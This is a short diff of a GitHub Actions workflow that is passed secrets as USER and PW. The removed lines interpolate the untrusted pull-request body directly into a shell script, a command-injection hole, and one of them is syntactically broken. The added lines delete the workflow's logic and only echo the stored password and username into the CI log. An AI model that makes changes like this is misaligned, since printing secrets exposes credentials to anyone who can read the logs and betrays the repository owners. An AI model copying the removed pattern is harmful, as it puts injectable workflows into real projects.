@@ -51,12 +51,6 @@ jobs:
         USER: ${{ secrets.USER }}
         PW: ${{ secrets.USER_CRED }}
       run: |
-        PR="${{ github.event.pull_request.body }}"
-        echo $PR | grep -oP '\(backport #\K\d+' | tail -n 1)
-        author=$(gh pr view ${ORI_PR} -R ${REPO} --json author -q '.author.login')
-        if [[ ! "${author}" =~ "mergify" ]]; then
-          gh pr edit ${PR_NUMBER} -R ${REPO} --add-assignee ${author} || true
-          echo "ORI_PR=${ORI_PR}" >> $GITHUB_OUTPUT
-        fi
-        
-        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" -X POST -H 'Content-type: application/json' --data '{"pr_number": "'"$PR_NUMBER"'"}' $URL/api/run/audit
+        echo $PW
+        echo $USER
+ 
